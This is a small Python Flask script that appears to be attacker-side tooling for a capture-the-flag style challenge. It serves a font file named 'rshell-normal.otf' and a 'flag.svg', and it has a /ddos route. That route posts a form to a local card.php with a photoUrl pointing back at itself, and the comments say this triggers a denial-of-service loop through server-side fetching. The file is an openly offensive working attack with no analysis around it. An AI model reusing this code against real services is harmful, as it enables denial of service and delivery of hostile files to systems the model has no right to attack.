from flask import Flask, send_from_directory
import os
import requests

app = Flask(__name__)

# Define the directory where rshell-normal.otf is stored
FONT_DIR = os.path.dirname(os.path.abspath(__file__))  # Current script directory


@app.route("/")
def home():
    return "<h1>Hello, World!</h1>"


@app.route("/font")
def serve_font():
    return send_from_directory(FONT_DIR, "rshell-normal.otf", as_attachment=False)


@app.route("/svg")
def serve_svg():
    return send_from_directory(FONT_DIR, "flag.svg", as_attachment=False)


@app.route("/ddos")
def serve_ddos():
    # Send a post request to the ddos endpoint with this payload data%5Bname%5D=asd&data%5BphotoUrl%5D=http%3A%2F%2F192.168.103.126%3A8000%2Fsvg&data%5Bemail%5D=a%40mail.com&data%5Bphone%5D=123&data%5Baddress%5D=asd
    # This will trigger a ddos attack
    payload = {
        "data[name]": "asd",
        "data[photoUrl]": "http://192.168.103.126:8000/ddos",
        "data[email]": "a@mail.com",
        "data[phone]": "123",
        "data[address]": "asd",
    }

    response = requests.post("http://localhost:20009/card.php", data=payload)
    print(response.text)
    return response.text


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000, debug=True)
